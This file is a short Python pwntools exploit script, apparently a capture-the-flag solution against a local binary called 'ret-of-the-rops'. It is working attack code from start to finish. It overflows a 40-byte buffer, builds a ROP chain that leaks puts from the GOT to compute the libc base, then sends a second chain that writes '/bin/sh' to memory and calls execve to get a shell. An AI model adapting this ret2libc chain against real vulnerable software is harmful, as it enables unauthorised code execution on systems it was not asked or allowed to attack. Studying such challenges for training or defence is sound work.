#!/usr/bin/env python3


from pwn import *


e = ELF("./ret-of-the-rops")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
r = process("./ret-of-the-rops")
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
libc_leaker = b"A" * 40 + p64(pop_rdi) + p64(e.got.puts) + p64(e.plt.puts) + p64(e.sym.main) 
r.sendline(libc_leaker)
leak = u64(r.recvuntil(b"\x7f")[-6:].strip().decode('latin-1').ljust(8,'\x00'))
libc_base = leak - libc.sym.puts
log.info("The libc base of the process is " + hex(libc_base))
exploit = b"A" * 40 + p64(pop_rdi) + p64(0x404090) + p64(e.plt.gets) + p64(0x40125a) + p64(0) + p64(1) + p64(0x404090) + p64(0) + p64(0) + p64(0x3ff308) + p64(0x401240) + p64(0) * 7 + p64(libc_base + libc.sym.execve)
r.sendline(exploit)
r.sendline(b"/bin/sh\x00")
r.interactive()
